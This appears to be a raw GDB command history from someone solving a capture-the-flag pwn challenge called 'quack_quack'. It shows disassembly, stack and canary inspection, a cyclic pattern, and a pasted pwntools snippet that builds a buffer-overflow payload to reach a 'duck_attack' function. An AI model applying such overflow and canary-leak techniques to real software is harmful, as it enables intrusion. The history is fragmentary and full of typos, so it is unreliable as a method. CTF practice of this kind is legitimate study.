r
ni
si
ni
ni
disassemble 
r
Quack Quack 
r
c
exit
exit
r
c
disassemble 
x/100x $rbp-0x8
c
disassemble 
info registers 
x/100x $rbp-0x8
x/100gx $rbp-0x8
c
x/100gx $rbp-0x8
x/20gx $rbp-0x8
exit
c
disassemble 
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/20gx $rbp-0x8
c
x/gw $rbp-0x8
x/gwx $rbp-0x8
cc
c
x/gwx $rbp-0x8
x/2gwx $rbp-0x8
x/2gx $rbp-0x8
x/gx $rbp-0x8
c
r
b *duckling 
r
disassemble 
b *0x00000000004015da
d 1
r
exit
ni
ni
r
ni
x/gx $rbp-0x8
c
c
xit
exit
c
ni
x/gx $rbp-0x8
disassemble 0x0000000000408313
ni
disassemble duck_attack 
exti
exit
c
c
exit
disassemble main
disassemble duck_attack
exit
disassemble duckling 
disassemble duck_attack 
r
disassemble 
disassemble duckling 
b *0x00000000004015da
r
r
c
r
ni
ni
r
ni
info variables 
ni
x/s $rdi
ni
r
ni
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4A
r
ni
ni
r
ni
r
ni
b *duckling 
r
ni
x/s 0x420ffc39cd25a600
r
ni
ni
x/10x $rsp-8
x/10x $rbp-8
r
ni
ni
x/100hx $rbp
ni
x/100hx $rbp
x/100hx $rbp-0x8
r
ni
x/100hx $rbp-0x8
r
c
r
ni
disassemble 
c
r
c
r
d 2
r
b *duckling 
ni
r
c
r
d 3
r
r
r
r
r
A
r
disassemble 
b *0x0000000000401567
r
r
A
x/s $rax
x/s $rax
x/s (char)$rax
x/s (char *)$rax
x/s (char)$rax
)char)$rax
(char)$rax
print (char)$rax
disassemble 
ni
x/s $rax
x/s 0x402d31
ni
x/s $rax
ninini
ni
disassemble 
x/s 0x402d60
x/s $rax
x/s $rsi
r
x/s $0x7fffffffd708
x/s 0x7fffffffd708
x/s $rbp-0x8
b *duckling
r
ni
x/s $rbp-0x8
disassemble 
x/10x $rbp-0x8
c
p = process('./quack_quack')
duck_attack_addr = p64(0x0000000000401383)
a = b"Quack Quack "
b = b"0x7fffffffd708" 
# 0x33f147ec95111400
print(len(a))
i = 0
payload = b"A" * (102 - len(a) - i) + a + b"A"*i
print(payload)
p.recvuntil(b"Quack the Duck!")
p.send(payload)
print(p.recv())
print(p.recv())
payload2 = b"IDK"
p.send(payload2)
print(p.recvall())
clear
r
ni
c
x/100hx $rbp-8
r
ni
r
ni
ni
c
r
ni
ni
b *0x00000000004015a7
ni
x/s $rax
r
c
d 1
d 4
d 5
r
ni
x/s $rax
x/s $rax-3
x/s $rax-4
ni
r
ni
x/gx $rax
x/gx $rbp-0x4
x/gx $rbp-0x8
disassemble 
x/gx $rbp-0x8
r
ni
x/gx $rbp-0x8
x/gx $rax
ni
ni
r
ni
Quack Quack AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ni
c
r
ni
x/gx $rbp-0x8
exit
